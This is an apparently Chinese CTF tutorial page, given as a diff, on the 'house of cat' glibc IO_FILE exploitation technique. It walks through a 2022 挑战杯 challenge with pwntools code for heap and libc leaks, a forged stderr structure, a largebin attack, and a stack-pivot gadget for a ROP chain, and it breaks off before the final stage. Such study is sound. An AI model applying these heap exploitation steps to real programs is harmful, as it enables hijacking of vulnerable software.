@@ -1,0 +1,742 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h4 data-content="1" id="333a382cfc3ec3107b852d895052ae57"><strong>适用版本：</strong></h4>
+<blockquote>
+<p>glibc 2.23 -- 至今</p>
+</blockquote>
+<p>‍</p>
+<h4 data-content="1" id="c4bdc2e198eca385a3a5e1e077d15645"><strong>利用条件:</strong></h4>
+<blockquote>
+<ul>
+<li>可以进行一次任意地址写堆地址</li>
+<li>可以触发 IO 流操作</li>
+</ul>
+</blockquote>
+<p>‍</p>
+<h4 data-content="1" id="d45715583b50d41db5a9a9f510e40ab1">攻击方法：</h4>
+<blockquote>
+<ul>
+<li>劫持stderr指针为我们构造的fake_IO_FILE（伪造好stderr和_wide_data结构体）</li>
+<li>触发 IO 流操作</li>
+</ul>
+</blockquote>
+<p>‍</p>
+<h4 data-content="1" id="a312c072ab7991cc45c24daab1cf1650">源码分析：</h4>
+<p>触发<code>__malloc_assert</code>​后会有这样一条调用链：</p>
+<p>​<code>__malloc_assert -&gt;  __fxprintf -&gt; __vfxprintf-&gt;locked_vfxprintf -&gt; __vfprintf_internal -&gt; _IO_file_xsputn</code>​</p>
+<p>其中<code>_IO_file_xsputn</code>​是通过<code>vtable</code>​ 处的指针来调用，且在<code>_IO_file_jumps</code>​中<code>_IO_file_xsputn</code>​函数和<code>_IO_wfile_seekoff</code>​相差0x10大小</p>
+<p>​<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230323083452-8698fa20-c912-1.png"/>​</p>
+<p>我们通过劫持 <code>_IO_2_1_stderr</code>​ 结构体，并将 <code>vtable</code>​ 处的指针改为<code>_IO_wfile_seekoff</code>​，来执行我们想要的链：</p>
+<p>​<code>_IO_wfile_seekoff -&gt; _IO_switch_to_wget_mode</code>​-&gt;<code>_IO_WOVERFLOW</code>​</p>
+<div class="highlight"><pre><span></span><span class="c1">//_IO_wfile_seekoff函数源码</span>
+
+<span class="n">off64_t</span>
+<span class="nf">_IO_wfile_seekoff</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="n">off64_t</span> <span class="n">offset</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dir</span><span class="p">,</span> <span class="kt">int</span> <span class="n">mode</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">off64_t</span> <span class="n">result</span><span class="p">;</span>
+  <span class="n">off64_t</span> <span class="n">delta</span><span class="p">,</span> <span class="n">new_offset</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="kt">int</span> <span class="n">count</span><span class="p">;</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">mode</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">do_ftell_wide</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+  <span class="kt">int</span> <span class="n">must_be_exact</span> <span class="o">=</span> <span class="p">((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span>
+            <span class="o">==</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">)</span>
+               <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span>
+               <span class="o">==</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">));</span>
+
+  <span class="kt">bool</span> <span class="n">was_writing</span> <span class="o">=</span> <span class="p">((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span>
+               <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
+              <span class="o">||</span> <span class="n">_IO_in_put_mode</span> <span class="p">(</span><span class="n">fp</span><span class="p">));</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">was_writing</span> <span class="o">&amp;&amp;</span> <span class="n">_IO_switch_to_wget_mode</span> <span class="p">(</span><span class="n">fp</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">WEOF</span><span class="p">;</span>
+<span class="p">......</span>
+<span class="p">}</span>
+</pre></div>
+<p>通过 <code>_IO_wfile_seekoff</code>​ 函数来触发 <code>_IO_switch_to_wget_mode</code>​ 函数，进而执行 <code>_IO_switch_to_wget_mode</code>​ 函数再触发宏调用函数<code>_IO_WOVERFLOW</code>​</p>
+<div class="highlight"><pre><span></span><span class="c1">//_IO_switch_to_wget_mode 函数源码</span>
+
+<span class="n">_IO_switch_to_wget_mode</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
+    <span class="k">if</span> <span class="p">((</span><span class="kt">wint_t</span><span class="p">)</span><span class="n">_IO_WOVERFLOW</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">WEOF</span><span class="p">)</span> <span class="o">==</span> <span class="n">WEOF</span><span class="p">)</span>
+      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
+<span class="p">......</span>
+<span class="p">}</span>
+</pre></div>
+<p>若满足 <code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>​ 这个条件，<code>_IO_WOVERFLOW</code>​ 函数会通过跳转到<code>_wide_vtable</code>​ 中的函数指针</p>
+<p>我们可以通过控制<code>_wide_vtable</code>​处的指针，来劫持程序的执行流</p>
+<p>若未开沙箱，则可直接劫持<code>_wide_vtable</code>​为one_gadget</p>
+<p>若execve函数被禁，则可通过magic_gadget和leave_ret构造栈迁移，来完全控制程序流执行rop链，详细可以在<a href="https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_32" target="_blank">CTF 中 glibc堆利用 及 IO_FILE 总结</a> 学习</p>
+<blockquote>
+<p>magic_gadget：</p>
+<p>&lt;svcudp_reply+26&gt;:    mov    rbp,QWORD PTR [rdi+0x48]</p>
+<p>&lt;svcudp_reply+30&gt;:    mov    rax,QWORD PTR [rbp+0x18]</p>
+<p>&lt;svcudp_reply+34&gt;:    lea       r13,[rbp+0x10]</p>
+<p>&lt;svcudp_reply+38&gt;:    mov    DWORD PTR [rbp+0x10],0x0</p>
+<p>&lt;svcudp_reply+45&gt;:    mov    rdi,r13</p>
+<p>&lt;svcudp_reply+48&gt;:    call      QWORD PTR [rax+0x28]</p>
+</blockquote>
+<p>‍</p>
+<h4 data-content="1" id="22536862a4d59e8dd50a33d5ed352681">例题2022挑战杯 house of cat</h4>
+<p>保护全开，开了沙箱</p>
+<p>​<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230323083505-8e5dace2-c912-1.png"/>​</p>
+<h5 data-content="1" id="4e401ae4f2fcff58c663cc29d4fdc6f3">程序分析：</h5>
+<p>限制申请大小 0x418-0x46f，限制修改次数两次并只能修改0x30字节</p>
+<p>存在UAF漏洞，限制泄露数据最大大小为0x30字节</p>
+<p>‍</p>
+<p>题目除了前面的加密，本身算是一道标准的菜单题，不过我们主要是要分析这道题里house of cat手法如何利用，前面需要逆向的部分不再赘述</p>
+<p>由于开了沙箱的缘故，我们需要构造orw来读取flag。此外，送入orw前还需要构造close(0)，将标准输入关闭掉，这样再次read的时候flag文件描述符就将是0，则可以正常read flag文件</p>
+<p>‍</p>
+<h5 data-content="1" id="85fa35daaa95d7851e0ce727f055171f">利用详解：</h5>
+<blockquote>
+<ul>
+<li><strong>首先是泄露libc地址和heap地址</strong></li>
+<li><strong>伪造好stderr和_wide_data结构体</strong></li>
+<li><strong>largebin attack攻击stderr指针</strong></li>
+<li><strong>修改top_chunk大小并触发IO调用</strong></li>
+<li><strong>进入 house of cat 的调用链，通过_wide_data-&gt;vtable跳转到提前布置好的地址进行栈迁移</strong></li>
+<li><strong>栈迁移后便已完全控制程序流，跳转执行rop链</strong></li>
+</ul>
+</blockquote>
+<p>‍</p>
+<p>‍</p>
+<p>首先看一下我们要伪造的两个结构体stderr和_IO_wide_data伪造前的样子</p>
+<p><strong>stderr</strong></p>
+<div class="highlight"><pre><span></span><span class="n">p</span> <span class="o">*</span><span class="p">(</span><span class="k">struct</span> <span class="n">_IO_FILE_plus</span><span class="o">*</span><span class="p">)</span> <span class="n">stderr</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">p</span> <span class="n">_IO_2_1_stderr_</span>
+<span class="err">$</span><span class="mi">1</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="n">file</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="n">_flags</span> <span class="o">=</span> <span class="o">-</span><span class="mi">72540025</span><span class="p">,</span>
+    <span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="mh">0x7ff44001a723</span> <span class="o">&lt;</span><span class="n">_IO_2_1_stderr_</span><span class="o">+</span><span class="mi">131</span><span class="o">&gt;</span> <span class="s">""</span><span class="p">,</span>
+    <span class="n">_IO_read_end</span> <span class="o">=</span> <span class="mh">0x7ff44001a723</span> <span class="o">&lt;</span><span class="n">_IO_2_1_stderr_</span><span class="o">+</span><span class="mi">131</span><span class="o">&gt;</span> <span class="s">""</span><span class="p">,</span>
+    <span class="n">_IO_read_base</span> <span class="o">=</span> <span class="mh">0x7ff44001a723</span> <span class="o">&lt;</span><span class="n">_IO_2_1_stderr_</span><span class="o">+</span><span class="mi">131</span><span class="o">&gt;</span> <span class="s">""</span><span class="p">,</span>
+    <span class="n">_IO_write_base</span> <span class="o">=</span> <span class="mh">0x7ff44001a723</span> <span class="o">&lt;</span><span class="n">_IO_2_1_stderr_</span><span class="o">+</span><span class="mi">131</span><span class="o">&gt;</span> <span class="s">""</span><span class="p">,</span>
+    <span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="mh">0x7ff44001a723</span> <span class="o">&lt;</span><span class="n">_IO_2_1_stderr_</span><span class="o">+</span><span class="mi">131</span><span class="o">&gt;</span> <span class="s">""</span><span class="p">,</span>
+    <span class="n">_IO_write_end</span> <span class="o">=</span> <span class="mh">0x7ff44001a723</span> <span class="o">&lt;</span><span class="n">_IO_2_1_stderr_</span><span class="o">+</span><span class="mi">131</span><span class="o">&gt;</span> <span class="s">""</span><span class="p">,</span>
+    <span class="n">_IO_buf_base</span> <span class="o">=</span> <span class="mh">0x7ff44001a723</span> <span class="o">&lt;</span><span class="n">_IO_2_1_stderr_</span><span class="o">+</span><span class="mi">131</span><span class="o">&gt;</span> <span class="s">""</span><span class="p">,</span>
+    <span class="n">_IO_buf_end</span> <span class="o">=</span> <span class="mh">0x7ff44001a724</span> <span class="o">&lt;</span><span class="n">_IO_2_1_stderr_</span><span class="o">+</span><span class="mi">132</span><span class="o">&gt;</span> <span class="s">""</span><span class="p">,</span>
+    <span class="n">_IO_save_base</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+    <span class="n">_IO_backup_base</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+    <span class="n">_IO_save_end</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+    <span class="n">_markers</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+    <span class="n">_chain</span> <span class="o">=</span> <span class="mh">0x7ff44001a780</span> <span class="o">&lt;</span><span class="n">_IO_2_1_stdout_</span><span class="o">&gt;</span><span class="p">,</span>
+    <span class="n">_fileno</span> <span class="o">=</span> <span class="mi">2</span><span class="p">,</span>
+    <span class="n">_flags2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+    <span class="n">_old_offset</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
+    <span class="n">_cur_column</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+    <span class="n">_vtable_offset</span> <span class="o">=</span> <span class="mi">0</span> <span class="sc">'\000'</span><span class="p">,</span>
+    <span class="n">_shortbuf</span> <span class="o">=</span> <span class="s">""</span><span class="p">,</span>
+    <span class="n">_lock</span> <span class="o">=</span> <span class="mh">0x7ff44001ba60</span> <span class="o">&lt;</span><span class="n">_IO_stdfile_2_lock</span><span class="o">&gt;</span><span class="p">,</span>
+    <span class="n">_offset</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
+    <span class="n">_codecvt</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+    <span class="n">_wide_data</span> <span class="o">=</span> <span class="mh">0x7ff4400198a0</span> <span class="o">&lt;</span><span class="n">_IO_wide_data_2</span><span class="o">&gt;</span><span class="p">,</span>
+    <span class="n">_freeres_list</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+    <span class="n">_freeres_buf</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+    <span class="n">__pad5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+    <span class="n">_mode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+    <span class="n">_unused2</span> <span class="o">=</span> <span class="sc">'\000'</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">19</span> <span class="n">times</span><span class="o">&gt;</span>
+  <span class="p">},</span>
+  <span class="n">vtable</span> <span class="o">=</span> <span class="mh">0x7ff440016600</span> <span class="o">&lt;</span><span class="n">_IO_file_jumps</span><span class="o">&gt;</span>
+<span class="p">}</span>
+</pre></div>
+<p><strong>_IO_wide_data</strong></p>
+<div class="highlight"><pre><span></span><span class="n">p</span> <span class="o">*</span><span class="p">(</span><span class="k">struct</span> <span class="n">_IO_wide_data</span><span class="o">*</span><span class="p">)</span> <span class="mh">0x555555554000</span>
+<span class="cp">#0x555555554000为heap基地址</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">p</span> <span class="o">*</span><span class="p">(</span><span class="k">struct</span> <span class="n">_IO_wide_data</span><span class="o">*</span><span class="p">)</span> <span class="mh">0x558944aed000</span>
+<span class="err">$</span><span class="mi">2</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="mh">0x10102464c457f</span> <span class="o">&lt;</span><span class="nl">error</span><span class="p">:</span> <span class="n">Cannot</span> <span class="n">access</span> <span class="n">memory</span> <span class="n">at</span> <span class="n">address</span> <span class="mh">0x10102464c457f</span><span class="o">&gt;</span><span class="p">,</span>
+  <span class="n">_IO_read_end</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+  <span class="n">_IO_read_base</span> <span class="o">=</span> <span class="mh">0x1003e0003</span> <span class="o">&lt;</span><span class="nl">error</span><span class="p">:</span> <span class="n">Cannot</span> <span class="n">access</span> <span class="n">memory</span> <span class="n">at</span> <span class="n">address</span> <span class="mh">0x1003e0003</span><span class="o">&gt;</span><span class="p">,</span>
+  <span class="n">_IO_write_base</span> <span class="o">=</span> <span class="mh">0x11f0</span> <span class="o">&lt;</span><span class="nl">error</span><span class="p">:</span> <span class="n">Cannot</span> <span class="n">access</span> <span class="n">memory</span> <span class="n">at</span> <span class="n">address</span> <span class="mh">0x11f0</span><span class="o">&gt;</span><span class="p">,</span>
+  <span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="mh">0x40</span> <span class="o">&lt;</span><span class="nl">error</span><span class="p">:</span> <span class="n">Cannot</span> <span class="n">access</span> <span class="n">memory</span> <span class="n">at</span> <span class="n">address</span> <span class="mh">0x40</span><span class="o">&gt;</span><span class="p">,</span>
+  <span class="n">_IO_write_end</span> <span class="o">=</span> <span class="mh">0x3148</span> <span class="o">&lt;</span><span class="nl">error</span><span class="p">:</span> <span class="n">Cannot</span> <span class="n">access</span> <span class="n">memory</span> <span class="n">at</span> <span class="n">address</span> <span class="mh">0x3148</span><span class="o">&gt;</span><span class="p">,</span>
+  <span class="n">_IO_buf_base</span> <span class="o">=</span> <span class="mh">0x38004000000000</span> <span class="o">&lt;</span><span class="nl">error</span><span class="p">:</span> <span class="n">Cannot</span> <span class="n">access</span> <span class="n">memory</span> <span class="n">at</span> <span class="n">address</span> <span class="mh">0x38004000000000</span><span class="o">&gt;</span><span class="p">,</span>
+  <span class="n">_IO_buf_end</span> <span class="o">=</span> <span class="mh">0x1c001d0040000d</span> <span class="o">&lt;</span><span class="nl">error</span><span class="p">:</span> <span class="n">Cannot</span> <span class="n">access</span> <span class="n">memory</span> <span class="n">at</span> <span class="n">address</span> <span class="mh">0x1c001d0040000d</span><span class="o">&gt;</span><span class="p">,</span>
+  <span class="n">_IO_save_base</span> <span class="o">=</span> <span class="mh">0x400000006</span> <span class="o">&lt;</span><span class="nl">error</span><span class="p">:</span> <span class="n">Cannot</span> <span class="n">access</span> <span class="n">memory</span> <span class="n">at</span> <span class="n">address</span> <span class="mh">0x400000006</span><span class="o">&gt;</span><span class="p">,</span>
+  <span class="n">_IO_backup_base</span> <span class="o">=</span> <span class="mh">0x40</span> <span class="o">&lt;</span><span class="nl">error</span><span class="p">:</span> <span class="n">Cannot</span> <span class="n">access</span> <span class="n">memory</span> <span class="n">at</span> <span class="n">address</span> <span class="mh">0x40</span><span class="o">&gt;</span><span class="p">,</span>
+  <span class="n">_IO_save_end</span> <span class="o">=</span> <span class="mh">0x40</span> <span class="o">&lt;</span><span class="nl">error</span><span class="p">:</span> <span class="n">Cannot</span> <span class="n">access</span> <span class="n">memory</span> <span class="n">at</span> <span class="n">address</span> <span class="mh">0x40</span><span class="o">&gt;</span><span class="p">,</span>
+  <span class="n">_IO_state</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="n">__count</span> <span class="o">=</span> <span class="mi">64</span><span class="p">,</span>
+    <span class="n">__value</span> <span class="o">=</span> <span class="p">{</span>
+      <span class="n">__wch</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+      <span class="n">__wchb</span> <span class="o">=</span> <span class="s">"</span><span class="se">\000\000\000</span><span class="s">"</span>
+    <span class="p">}</span>
+  <span class="p">},</span>
+  <span class="n">_IO_last_state</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="n">__count</span> <span class="o">=</span> <span class="mi">728</span><span class="p">,</span>
+    <span class="n">__value</span> <span class="o">=</span> <span class="p">{</span>
+      <span class="n">__wch</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+      <span class="n">__wchb</span> <span class="o">=</span> <span class="s">"</span><span class="se">\000\000\000</span><span class="s">"</span>
+    <span class="p">}</span>
+  <span class="p">},</span>
+  <span class="n">_codecvt</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="n">__cd_in</span> <span class="o">=</span> <span class="p">{</span>
+      <span class="n">step</span> <span class="o">=</span> <span class="mh">0x2d8</span><span class="p">,</span>
+      <span class="n">step_data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="n">__outbuf</span> <span class="o">=</span> <span class="mh">0x8</span> <span class="o">&lt;</span><span class="nl">error</span><span class="p">:</span> <span class="n">Cannot</span> <span class="n">access</span> <span class="n">memory</span> <span class="n">at</span> <span class="n">address</span> <span class="mh">0x8</span><span class="o">&gt;</span><span class="p">,</span>
+        <span class="n">__outbufend</span> <span class="o">=</span> <span class="mh">0x400000003</span> <span class="o">&lt;</span><span class="nl">error</span><span class="p">:</span> <span class="n">Cannot</span> <span class="n">access</span> <span class="n">memory</span> <span class="n">at</span> <span class="n">address</span> <span class="mh">0x400000003</span><span class="o">&gt;</span><span class="p">,</span>
+        <span class="n">__flags</span> <span class="o">=</span> <span class="mi">792</span><span class="p">,</span>
+        <span class="n">__invocation_counter</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+        <span class="n">__internal_use</span> <span class="o">=</span> <span class="mi">792</span><span class="p">,</span>
+        <span class="n">__statep</span> <span class="o">=</span> <span class="mh">0x318</span><span class="p">,</span>
+        <span class="n">__state</span> <span class="o">=</span> <span class="p">{</span>
+          <span class="n">__count</span> <span class="o">=</span> <span class="mi">28</span><span class="p">,</span>
+          <span class="n">__value</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="n">__wch</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+            <span class="n">__wchb</span> <span class="o">=</span> <span class="s">"</span><span class="se">\000\000\000</span><span class="s">"</span>
+          <span class="p">}</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+    <span class="p">},</span>
+    <span class="n">__cd_out</span> <span class="o">=</span> <span class="p">{</span>
+      <span class="n">step</span> <span class="o">=</span> <span class="mh">0x1c</span><span class="p">,</span>
+      <span class="n">step_data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="n">__outbuf</span> <span class="o">=</span> <span class="mh">0x1</span> <span class="o">&lt;</span><span class="nl">error</span><span class="p">:</span> <span class="n">Cannot</span> <span class="n">access</span> <span class="n">memory</span> <span class="n">at</span> <span class="n">address</span> <span class="mh">0x1</span><span class="o">&gt;</span><span class="p">,</span>
+        <span class="n">__outbufend</span> <span class="o">=</span> <span class="mh">0x400000001</span> <span class="o">&lt;</span><span class="nl">error</span><span class="p">:</span> <span class="n">Cannot</span> <span class="n">access</span> <span class="n">memory</span> <span class="n">at</span> <span class="n">address</span> <span class="mh">0x400000001</span><span class="o">&gt;</span><span class="p">,</span>
+        <span class="n">__flags</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+        <span class="n">__invocation_counter</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+        <span class="n">__internal_use</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+        <span class="n">__statep</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+        <span class="n">__state</span> <span class="o">=</span> <span class="p">{</span>
+          <span class="n">__count</span> <span class="o">=</span> <span class="mi">2512</span><span class="p">,</span>
+          <span class="n">__value</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="n">__wch</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+            <span class="n">__wchb</span> <span class="o">=</span> <span class="s">"</span><span class="se">\000\000\000</span><span class="s">"</span>
+          <span class="p">}</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">},</span>
+  <span class="n">_shortbuf</span> <span class="o">=</span> <span class="sa">L</span><span class="s">"</span><span class="se">\x9d0</span><span class="s">"</span><span class="p">,</span>
+  <span class="n">_wide_vtable</span> <span class="o">=</span> <span class="mh">0x1000</span>
+<span class="p">}</span>
+</pre></div>
+<p>​<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230323083550-a9308e2c-c912-1.png"/>​</p>
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<h5 data-content="1" id="0749d11cf888642a97e4ddf7fe1575f8">获取libc基址和heap基址</h5>
+<div class="highlight"><pre><span></span><span class="n">add</span><span class="p">(</span><span class="mi">14</span><span class="p">,</span><span class="mh">0x450</span><span class="p">,</span><span class="sa">b</span><span class="s1">'o'</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">13</span><span class="p">,</span><span class="mh">0x450</span><span class="p">,</span><span class="sa">b</span><span class="s1">'p'</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span><span class="mh">0x460</span><span class="p">,</span><span class="sa">b</span><span class="s1">'n'</span><span class="p">)</span>
+<span class="n">show</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'Context:</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
+<span class="n">libc_base</span><span class="o">=</span><span class="n">l64</span><span class="p">()</span><span class="o">-</span><span class="mh">0x21a0e0</span><span class="c1">#-0x10-libc.sym['__malloc_hook']</span>
+<span class="n">li</span><span class="p">(</span><span class="s1">'libc_base = '</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+
+<span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"</span><span class="se">\x55</span><span class="s2">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span><span class="o">-</span><span class="mh">0x290</span>
+<span class="n">li</span><span class="p">(</span><span class="s1">'heap_base = '</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">))</span>
+</pre></div>
+<p>‍</p>
+<h5 data-content="1" id="d88d533d135f407851c98ff54e202406">largebin attack攻击stderr指针</h5>
+<div class="highlight"><pre><span></span><span class="n">fake_file</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span>
+<span class="n">fake_file</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span>
+<span class="n">fake_file</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x1180</span><span class="o">+</span><span class="mh">0x30</span><span class="p">)</span> 
+<span class="cp">#_IO_save_base -- _IO_2_1_stderr_+72</span>
+<span class="n">fake_file</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">7</span>
+<span class="n">fake_file</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">lock</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
+<span class="cp">#_IO_stdfile_2_lock</span>
+<span class="n">fake_file</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x10a0</span><span class="p">)</span>
+<span class="cp">#_wide_data</span>
+<span class="n">fake_file</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">6</span>
+<span class="n">fake_file</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">IO_wfile_jumps</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="cp">#fake_file+=</span>
+
+<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x428</span><span class="p">,</span><span class="n">fake_file</span><span class="p">)</span>
+</pre></div>
+<p>​<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230323083603-b1224828-c912-1.png"/>​</p>
+<div class="highlight"><pre><span></span><span class="n">pl</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x21a0d0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">IO_list_all</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">stderr</span><span class="o">-</span><span class="mh">0x20</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">pl</span><span class="p">)</span>
+<span class="cp">#main_arena+1104  main_arena+1104</span>
+<span class="cp">#IO_list_all      stderr-0x20</span>
+
+<span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="err">#</span><span class="n">ub</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x440</span><span class="p">,</span><span class="n">b</span><span class="sc">'c'</span><span class="p">)</span> <span class="err">#</span><span class="n">attack</span>
+</pre></div>
+<p>​​</p>
+<p>‍</p>
+<h5 data-content="1" id="92c0b83dd00b4224e3ca62322a3ca83c">修改top_chunk大小并触发IO调用</h5>
+<div class="highlight"><pre><span></span><span class="n">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mh">0x418</span><span class="p">,</span><span class="n">b</span><span class="sc">'d'</span><span class="p">)</span> <span class="err">#</span><span class="n">r</span> <span class="n">chunk1</span>
+</pre></div>
+<blockquote>
+<p>​<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230323083614-b7b592bc-c912-1.png"/>​</p>
+<p>freed</p>
+<p>chunk 15</p>
+<p>chunk 4</p>
+<p>chunk 2</p>
+<p>chunk 3</p>
+</blockquote>
+<p>‍</p>
+<p>‍</p>
